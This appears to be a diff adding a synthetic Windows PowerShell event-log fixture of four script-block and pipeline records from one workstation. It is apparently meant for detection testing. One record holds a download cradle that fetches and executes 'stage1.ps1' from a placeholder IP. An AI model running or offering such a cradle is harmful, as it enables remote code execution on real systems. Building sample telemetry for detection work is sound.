@@ -1,0 +1,97 @@
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="a0c1853b-5c40-4b57-876a-e526cf9689f4"/>
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>106</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-10-02T09:12:41.9000000Z"/>
+      <EventRecordID>601</EventRecordID>
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>WS-FIN-014</Computer>
+      <Security UserID="S-1-5-21-1111111111-2222222222-3333333333-1001"/>
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage1.ps1')</Data>
+      <Data Name="ScriptBlockId">aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee</Data>
+      <Data Name="Path"/>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="a0c1853b-5c40-4b57-876a-e526cf9689f4"/>
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-10-02T09:12:41.9500000Z"/>
+      <EventRecordID>602</EventRecordID>
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>WS-FIN-014</Computer>
+      <Security UserID="S-1-5-21-1111111111-2222222222-3333333333-1001"/>
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.19041.1
+        Engine Version = 5.1.19041.1
+        Runspace ID = 11111111-2222-3333-4444-555555555555
+        Pipeline ID = 1
+        Command Name = IEX
+        Command Type = Alias
+        Script Name =
+        Command Path =
+        Sequence Number = 12
+        User = FIN-014\m.alvarez
+        Connected User =
+        Shell ID = Microsoft.PowerShell
+      </Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="a0c1853b-5c40-4b57-876a-e526cf9689f4"/>
+      <EventID>4105</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>106</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-10-02T09:12:41.8800000Z"/>
+      <EventRecordID>603</EventRecordID>
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>WS-FIN-014</Computer>
+      <Security UserID="S-1-5-21-1111111111-2222222222-3333333333-1001"/>
+    </System>
+    <EventData>
+      <Data Name="ScriptBlockId">aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="a0c1853b-5c40-4b57-876a-e526cf9689f4"/>
+      <EventID>4106</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>106</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-10-02T09:12:42.0100000Z"/>
+      <EventRecordID>604</EventRecordID>
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>WS-FIN-014</Computer>
+      <Security UserID="S-1-5-21-1111111111-2222222222-3333333333-1001"/>
+    </System>
+    <EventData>
+      <Data Name="ScriptBlockId">aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee</Data>
+      <Data Name="Path"/>
+    </EventData>
+  </Event>
+</Events>
